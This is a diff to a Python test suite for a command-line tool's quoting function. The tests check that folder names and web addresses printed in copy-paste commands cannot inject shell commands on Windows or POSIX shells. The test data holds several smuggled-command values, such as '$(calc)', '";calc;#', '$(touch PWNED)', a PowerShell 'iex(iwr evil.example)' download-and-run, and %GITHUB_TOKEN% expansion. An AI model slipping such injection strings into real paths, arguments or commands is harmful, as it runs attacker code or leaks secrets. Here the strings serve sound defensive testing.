@@ -1332,7 +1332,7 @@ class TestWhoseTextThisIs:
         ("rates-2_a.b", "rates-2_a.b"),
         ("https://example.org/acme/x&calc.exe", '"https://example.org/acme/x&calc.exe"'),
         ("https://dev.azure.com/org/My%20Project/_git/rates", '"https://dev.azure.com/org/My%20Project/_git/rates"'),
-        ('a"b', '"a""b"'),
+        ("C:\\it's (old) & co\\rates", '"C:\\it\'s (old) & co\\rates"'),
     ])
     def test_for_cmd_a_word_with_anything_it_reads_is_in_double_quotes(self, word, typed):
         """Found by the second pass (not run on Windows): `&` ends a command there, and the address that held one was printed bare.
@@ -1353,6 +1353,16 @@ class TestWhoseTextThisIs:
         # In a POSIX shell, as shlex has it
         for posix in (words, ["chartbook", "pin", "--project-dir", "/work/it's"], ["chartbook", "pin", ""]):
             assert missing.typed(posix, windows=False) == shlex.join(posix)
+
+    def test_a_folder_a_message_tells_to_type_is_written_by_the_one_function(self):
+        """Found by the second pass: two messages wrote a folder after `--project-dir` their own way (a Python repr; double quotes of their own, and bare on Windows)."""
+        source = Path(missing.__file__).parent
+        written = [
+            (file.name, found[1]) for file in sorted(source.rglob("*.py"))
+            for found in re.finditer(r"--project-dir \{([^{}]*)\}", file.read_text(encoding="utf-8"))
+        ]
+        assert len(written) >= 5
+        assert [(name, how) for name, how in written if "_quoted(" not in how] == []
 
     def test_no_other_code_quotes_a_command_for_a_posix_shell_alone(self):
         """One function quotes what is printed to be pasted. `shlex` is for a POSIX shell, and a message is read on Windows too.
@@ -1449,9 +1459,10 @@ class TestWhoseTextThisIs:
     def test_for_windows_every_sign_a_shell_reads_puts_a_word_in_double_quotes(self):
         """Found by review: four signs were held by a test, and a rule that left any other bare passed them all."""
         bare = set("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_./:-")
+        read = set('$`"!%')  # even inside them: such a word is not written at all
         for sign in map(chr, range(0x20, 0x7F)):
             word = f"a{sign}b"
-            typed = word if sign in bare else '"a""b"' if sign == '"' else f'"{word}"'
+            typed = word if sign in bare else missing.NOT_TEXT if sign in read else f'"{word}"'
             assert missing._quoted(word, windows=True) == typed, sign
 
 
@@ -1477,18 +1488,50 @@ class TestWhatAShellOnWindowsReadsInQuotes:
         (["https://example.org/acme/%CD%2Frates"], "`%CD%`"),  # cmd.exe's own, set or not
         (["https://example.org/acme/%20%GITHUB_TOKEN%"], "`%GITHUB_TOKEN%`"),  # the `%` that ended no name begins one
         (["C:\\work\\rates", "https://example.org/acme/%GITHUB_TOKEN%"], "`%GITHUB_TOKEN%`"),
+        (["https://example.org/acme/%PATH%"], "`%PATH%`"),  # a variable is one whatever case its name was set in
         (["https://example.org/acme/My%20Big%20Project"], ""),  # `20Big` is no variable
-        (["https://example.org/acme/100%"], ""),
-        (["C:\\work\\my rates (old) & co", "https://example.org/acme/rates"], ""),
+        (["https://example.org/acme/%C3%A9t%C3%A9"], ""),
+        (["C:\\work\\my rates (old) & co; it's #1 @home ^ {x} [y] = ~a, b+c", "https://example.org/acme/rates"], ""),
+        # Found by the second pass of the review, each of them:
+        (["https://example.org/acme/%OTHER_TOKEN%"], "a `%`"),  # no variable here, and it may be one where the line is pasted
+        (["https://example.org/acme/%=C:%"], "a `%`"),  # cmd.exe's own name for where it is on a drive
+        (["https://example.org/acme/%__CD__%"], "`%__CD__%`"),
+        (["https://example.org/acme/100%"], "a `%`"),
+        (["C:\\work\\mid\\pipes\\\";calc;#"], 'a `"`'),  # Git Bash: `\\"` is a quote that is text, and the next ends the word
+        (["C:\\work\\mid\\x\u201d;iex(iwr evil.example);#"], "a `\u201d`"),  # PowerShell: a quote, as the plain one is
+        (["C:\\work\\\u201cx"], "a `\u201c`"),
+        (["C:\\work\\\u201ex"], "a `\u201e`"),
+        (["C:\\work\\%USER\u200bNAME%\\mid"], "`%USERNAME%`"),  # read as it is printed: without what prints as nothing
+        (["\\\\server\\home$\\ab123\\work\\mid"], ""),  # a share that is not listed: a `$` before a slash is text
+        (["\\\\server\\c$"], ""),
+        (["//server/home$/work"], ""),
+        (["C:\\work\\a$ b"], "a `$`"),
+        ([Path("C:\\work\\$x")], "a `$`"),
     ])
     def test_what_is_read(self, words, said):
-        assert missing._a_windows_shell_reads(words, environment=["Path", "GITHUB_TOKEN"]) == said
+        assert missing._a_windows_shell_reads(words, environment=["Path", "GITHUB_TOKEN", "UserName"]) == said
 
     def test_the_variables_are_this_machines(self, monkeypatch):
-        monkeypatch.setenv("CB_TEST_SECRET", "x")
-        monkeypatch.delenv("CB_TEST_NONE", raising=False)
-        assert missing._a_windows_shell_reads(["https://example.org/acme/%cb_test_secret%"]) == "`%cb_test_secret%`"
-        assert missing._a_windows_shell_reads(["https://example.org/acme/%CB_TEST_NONE%"]) == ""
+        """A name that begins and is followed as a web address writes a sign (`%AB…%20`) is a variable only if this machine has it."""
+        word = "https://example.org/acme/%AB_TEST_SECRET%20x"
+        monkeypatch.setenv("AB_TEST_SECRET", "x")
+        assert missing._a_windows_shell_reads([word]) == "`%AB_TEST_SECRET%`"
+        assert missing._a_windows_shell_reads([word.lower()]) == "`%ab_test_secret%`"
+        monkeypatch.delenv("AB_TEST_SECRET")
+        assert missing._a_windows_shell_reads([word]) == ""
+        # Any other name is taken for one, set here or not: it may be set where the line is pasted
+        assert missing._a_windows_shell_reads(["https://example.org/acme/%CB_TEST_NONE%"]) == "a `%`"
+
+    def test_no_command_any_message_prints_holds_one(self):
+        """The one function writes every folder and every word of the user's that a message tells to type. On Windows it never writes one a shell would read."""
+        read = ["C:\\work\\$(calc)", "C:\\work\\x\u201d;calc;#", "C:\\work\\a`b", "C:\\work\\!rm", 'C:\\work\\a";calc;#', "https://example.org/%CD%2F"]
+        for word in read:
+            assert missing._quoted(word, windows=True) == missing.NOT_TEXT == "ITS-NAME-HOLDS-A-SIGN-A-SHELL-READS"
+            assert missing._in(word, windows=True) == f" --project-dir {missing.NOT_TEXT}"
+            assert missing.typed(["chartbook", "restore", "--project-dir", word], windows=True) == f"chartbook restore --project-dir {missing.NOT_TEXT}"
+            # In a POSIX shell single quotes make it text, and it is given
+            assert missing._quoted(word, windows=False) == shlex.quote(word)
+        assert not missing._a_windows_shell_reads([missing.NOT_TEXT])
 
     def _said(self, work: Path, line: missing.Wanted, windows: bool) -> list[str]:
         listing = missing.Listing("acme/report", work / "report", stores=[str(work / "mine")], wanted=[line])
@@ -1500,14 +1543,55 @@ class TestWhatAShellOnWindowsReadsInQuotes:
         assert self._said(work, line, windows=True) == [
             "1. acme/mid at ccccccc    https://example.org/acme/$env:GITHUB_TOKEN",
             "     No command is given for it: one would hold a `$`, which a shell on Windows reads even inside quotes.",
-            f"     By hand, in its folder: `git checkout {self.COMMIT[:12]}`, then `chartbook run --snapshot`",
+            f"     By hand: `chartbook run --snapshot` in its folder, at {self.COMMIT[:12]}.",
         ]
         # Never pinned, and with no build script: what is to be typed by hand is the snapshot alone
         folder = missing.Wanted("acme/mid", None, folder=work / "a`b", builds=False)
         assert self._said(work, folder, windows=True)[1:] == [
             "     No command is given for it: one would hold a backtick, which a shell on Windows reads even inside quotes.",
-            "     By hand, in its folder: `chartbook snapshot`",
+            "     By hand: `chartbook snapshot` in its folder.",
         ]
+
+    def test_what_is_said_by_hand_names_no_checkout(self, work):
+        """Found by the second pass: "`git checkout …` in its folder" moved the reader's own repository, where the line was of a folder of it. What to make is said, and not how."""
+        line = missing.Wanted("acme/mid", self.COMMIT, folder=work / "report" / "!mid", top=work / "report")
+        listing = missing.Listing("acme/report", work / "report", stores=[str(work / "mine")], wanted=[line], top=work / "report")
+        said = missing.said(listing, here=work / "report", windows=True)
+        assert said[4:6] == [
+            "     No command is given for it: one would hold a `!`, which a shell on Windows reads even inside quotes.",
+            f"     By hand: `chartbook run --snapshot` in its folder, at {self.COMMIT[:12]}.",
+        ]
+        assert not any("git " in text for text in said)
+
+    def test_a_line_with_no_command_leaves_the_next_its_own(self, work):
+        """Found by the second pass: the second pipeline of a repository began at `git checkout`, in a clone the line above was to have made and did not."""
+        listing = missing.Listing("acme/report", work / "report", stores=[str(work / "mine")], wanted=[
+            missing.Wanted("acme/a", self.COMMIT, "https://example.org/acme/mono", subdirectory="$a", placed=True),
+            missing.Wanted("acme/b", self.COMMIT, "https://example.org/acme/mono", subdirectory="b", placed=True),
+        ])
+        said = missing.said(listing, here=work / "report", windows=True)
+        assert said[4].startswith("     No command is given for it: one would hold a `$`")
+        mono = missing._quoted(work / "mono", windows=True)
+        assert said[6:10] == [
+            "2. acme/b at ccccccc    https://example.org/acme/mono",
+            f"     git clone https://example.org/acme/mono {mono}",
+            f"     git -C {mono} checkout {self.COMMIT[:12]}",
+            f"     chartbook run --snapshot --project-dir {missing._quoted(work / 'mono' / 'b', windows=True)}",
+        ]
+
+    def test_the_last_line_is_read_too(self, work):
+        """Found by the second pass: the pipeline's own folder may be one of somebody's repository, and "by hand, in its folder" leads to a list whose last line names it."""
+        own = work / "mid" / "$(touch PWNED)"
+        listing = missing.Listing("acme/odd", own, stores=[str(work / "mine")], wanted=[missing.Wanted("acme/mid", None, folder=work / "mid")])
+        said = missing.said(listing, again="chartbook run --snapshot", here=own, windows=True)
+        assert said[-3:-1] == [
+            "Then here again:",
+            "     In this pipeline's folder, which no command can name (it holds a `$`): `chartbook run --snapshot`",
+        ]
+        assert not any("touch PWNED" in text for text in said if text.startswith("     "))
+        # In a POSIX shell it is text in single quotes, and the command names it
+        posix = missing.said(listing, again="chartbook run --snapshot", here=own, windows=False)
+        assert posix[-2] == f"     chartbook run --snapshot --project-dir {shlex.quote(str(own))}"
 
     def test_in_a_posix_shell_it_is_text_in_single_quotes_and_the_command_is_given(self, work):
         line = missing.Wanted("acme/mid", self.COMMIT, "https://example.org/acme/$env:GITHUB_TOKEN")
